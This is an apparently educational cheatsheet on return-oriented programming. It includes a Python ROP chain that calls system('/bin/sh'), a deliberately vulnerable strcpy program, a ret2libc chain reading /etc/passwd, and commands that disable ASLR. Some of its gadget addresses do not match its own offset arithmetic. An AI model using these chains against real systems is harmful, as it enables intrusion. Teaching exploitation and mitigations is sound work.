# Return-Oriented Programming (ROP) Cheatsheet
*A 5-Minute Technical Reference*

## What Is ROP?
ROP is an advanced exploitation technique that hijacks program control flow **without injecting new code**. Instead, it chains together existing code fragments called "gadgets" to perform malicious operations.

**Key Insight**: ROP turns a program's own legitimate code against itself by carefully orchestrating the execution sequence.

## Why ROP Exists
Modern defenses like **Data Execution Prevention (DEP/NX bit)** mark memory regions as non-executable, preventing traditional shellcode injection. ROP circumvents this by using code that's already in executable memory.

## Core Concepts

### Gadgets
Short instruction sequences ending in `ret` that perform specific operations:

```assembly
; Example gadgets found in typical programs
pop eax; ret                    ; Load value from stack into EAX
pop ebx; pop ecx; ret          ; Load two values from stack
mov [eax], ebx; ret            ; Write EBX to memory address in EAX
add eax, 0x10; ret             ; Add 16 to EAX
xor eax, eax; ret              ; Zero out EAX register
```

### Stack Layout for ROP Chain
```
High Memory
┌─────────────────┐
│   Gadget N      │ ← Final gadget address
├─────────────────┤
│   Argument 2    │ ← Data for previous gadget
├─────────────────┤
│   Gadget 2      │ ← Second gadget address  
├─────────────────┤
│   Argument 1    │ ← Data for first gadget
├─────────────────┤
│   Gadget 1      │ ← First gadget (overwrites return address)
├─────────────────┤
│   Buffer Data   │ ← Overflow padding
└─────────────────┘
Low Memory (Stack grows down)
```

## Practical Example: Calling system("/bin/sh")

### Step 1: Identify Required Gadgets
```bash
# Using ROPgadget tool to find gadgets in libc
$ ROPgadget --binary /lib/libc.so.6 --only "pop|ret"
0x7ffff7a3a738 : pop rdi; ret    # For setting first argument
0x7ffff7a3a739 : pop rsi; ret    # For setting second argument  
0x7ffff7a52390 : ret             # For stack alignment
```

### Step 2: Locate Target Function
```bash
# Find system() address in libc
$ objdump -T /lib/libc.so.6 | grep system
0000000000045390 g    DF .text  system

# Find "/bin/sh" string in libc
$ strings -a -t x /lib/libc.so.6 | grep "/bin/sh"
 18ce57 /bin/sh
```

### Step 3: Build ROP Chain (64-bit example)
```python
# Python exploit code structure
import struct

# Address calculations (assumes no ASLR for simplicity)
libc_base = 0x7ffff7a0d000
pop_rdi_ret = libc_base + 0x2a738      # pop rdi; ret gadget
bin_sh_addr = libc_base + 0x18ce57     # "/bin/sh" string
system_addr = libc_base + 0x45390      # system() function
ret_gadget = libc_base + 0x52390       # ret (for alignment)

# Build ROP chain
rop_chain = b""
rop_chain += b"A" * 72                 # Buffer overflow padding
rop_chain += struct.pack("<Q", pop_rdi_ret)  # Load argument into RDI
rop_chain += struct.pack("<Q", bin_sh_addr)  # "/bin/sh" string address
rop_chain += struct.pack("<Q", ret_gadget)   # Stack alignment  
rop_chain += struct.pack("<Q", system_addr)  # Call system()
```

### Step 4: Complete Exploit Template
```c
// Vulnerable C program example
#include <stdio.h>
#include <string.h>

void vulnerable_function(char* input) {
    char buffer[64];              // Small buffer
    strcpy(buffer, input);        // Unsafe copy - buffer overflow!
    printf("Input: %s\n", buffer);
}

int main(int argc, char* argv[]) {
    if (argc > 1) {
        vulnerable_function(argv[1]);
    }
    return 0;
}
```

```bash
# Compile with protections disabled for testing
gcc -o vulnerable -fno-stack-protector -z execstack -no-pie vulnerable.c

# Execute ROP exploit
python3 exploit.py | ./vulnerable
```

## Advanced ROP Techniques

### ret2libc Chain
```python
# Chain multiple function calls
# Goal: system("cat /etc/passwd")
rop_chain += struct.pack("<Q", pop_rdi_ret)
rop_chain += struct.pack("<Q", passwd_cmd_addr)    # "cat /etc/passwd"
rop_chain += struct.pack("<Q", system_addr)
```

### Stack Pivoting
```assembly
; When you need to move stack pointer to controlled memory
mov esp, eax; ret               ; Pivot stack to address in EAX
leave; ret                      ; mov esp, ebp; pop ebp; ret
```

## Detection and Analysis Tools

### Finding Gadgets
```bash
# ROPgadget - comprehensive gadget finder
ROPgadget --binary ./target_binary --ropchain

# ropper - alternative tool with advanced features  
ropper --file ./target_binary --search "pop rdi"

# objdump - manual gadget hunting
objdump -d ./target_binary | grep -B5 -A5 "ret"
```

### Debugging ROP Chains
```bash
# GDB with PEDA/GEF for ROP analysis
gdb ./vulnerable_program
(gdb) pattern create 100        # Create cyclic pattern
(gdb) run [pattern]             # Trigger overflow
(gdb) pattern offset [value]    # Find offset to return address
```

## Common Defenses

### Stack Canaries
```c
// Compiler inserts canary value before return address
void function() {
    unsigned long canary = __stack_chk_guard;
    char buffer[100];
    // ... function code ...
    if (canary != __stack_chk_guard) {
        __stack_chk_fail();  // Abort if canary corrupted
    }
}
```

### ASLR (Address Space Layout Randomization)
- Randomizes base addresses of executable regions
- Requires information leaks to determine gadget locations
- Can be bypassed with format string bugs or pointer disclosures

### Control Flow Integrity (CFI)
- Hardware/software checks for valid control transfers
- Intel CET (Control-flow Enforcement Technology)
- ARM Pointer Authentication

## Key Requirements for ROP
1. **Memory corruption vulnerability** (buffer overflow, format string, etc.)
2. **Executable code regions** containing useful gadgets
3. **Knowledge of memory layout** (addresses of gadgets and functions)
4. **Sufficient gadgets** to perform desired operations

## Quick Reference Commands
```bash
# Disable ASLR for testing
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Check binary protections
checksec --file=./binary

# Find library base address
cat /proc/[pid]/maps | grep libc

# Calculate ROP chain addresses
python3 -c "print(hex(base_addr + offset))"
```

## Summary
ROP transforms innocent code fragments into malicious execution chains by manipulating the stack and return addresses. Understanding ROP is essential for both offensive security research and developing effective mitigations. The technique remains relevant despite modern defenses, often requiring sophisticated bypass methods that combine multiple exploitation primitives.

**Remember**: ROP attacks require precise memory layout knowledge and careful gadget selection. Practice in controlled environments and always consider the ethical implications of security research.
